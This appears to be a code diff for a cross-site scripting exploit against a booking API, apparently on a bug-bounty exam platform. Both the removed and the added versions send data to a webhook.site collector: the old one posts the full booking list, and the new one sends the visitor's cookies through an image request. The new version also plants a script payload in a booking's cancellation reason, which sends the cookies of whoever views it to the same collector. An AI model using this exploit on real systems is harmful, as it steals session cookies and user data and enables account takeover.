@@ -1,31 +1,36 @@
-<script>
-    const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
-    const api = "https://api-bugbounty-exam.hashacademy.co/api";
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const webhook = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
+        const api = "https://api-bugbounty-exam.hashacademy.co/api";
+        const myBookingId = "69dc156ad9d06cf5969295d0";
 
-    async function exploit() {
-        // Step 1: Try to list all bookings to find the Admin's ID
-        try {
-            const res = await fetch(`${api}/bookings`, { credentials: "include" });
-            const bookings = await res.json();
-            await fetch(logger + "?action=all_bookings", { method: "POST", body: JSON.stringify(bookings) });
+        // 1. Immediate Cookie Steal (The simplest check)
+        // We use a Image object because it doesn't care about CORS as much as fetch()
+        new Image().src = webhook + "/?cookie=" + btoa(document.cookie);
 
-            // Step 2: Inject the XSS into the cancellation reason of YOUR booking
-            // This is safer because you know your ID works.
-            const yourBookingId = "69dc156ad9d06cf5969295d0";
-            const xssPayload = `"><img src=x onerror="fetch('${logger}?cookie='+document.cookie)">`;
-
-            await fetch(`${api}/bookings/${yourBookingId}/cancel`, {
-                method: "PUT",
-                headers: { "Content-Type": "application/json" },
-                credentials: "include",
-                body: JSON.stringify({ "reason": xssPayload })
-            });
-
-            fetch(logger + "?status=XSS_Injected_Into_Cancel");
-
-        } catch (e) {
-            fetch(logger + "?error=" + btoa(e.message));
+        async function fastExploit() {
+            // 2. Try to inject the XSS into the cancellation reason
+            // We use a very short payload to avoid character limits
+            const xss = "<script>fetch('" + webhook + "?f='+document.cookie)<\/script>";
+            
+            try {
+                await fetch(api + "/bookings/" + myBookingId + "/cancel", {
+                    method: "PUT",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "include",
+                    body: JSON.stringify({ "reason": xss })
+                });
+                
+                // Signal that the PUT finished
+                new Image().src = webhook + "/?status=PUT_DONE";
+            } catch (e) {
+                new Image().src = webhook + "/?err=" + btoa(e.message);
+            }
         }
-    }
-    exploit();
-</script>
+
+        fastExploit();
+    </script>
+</body>
+</html>
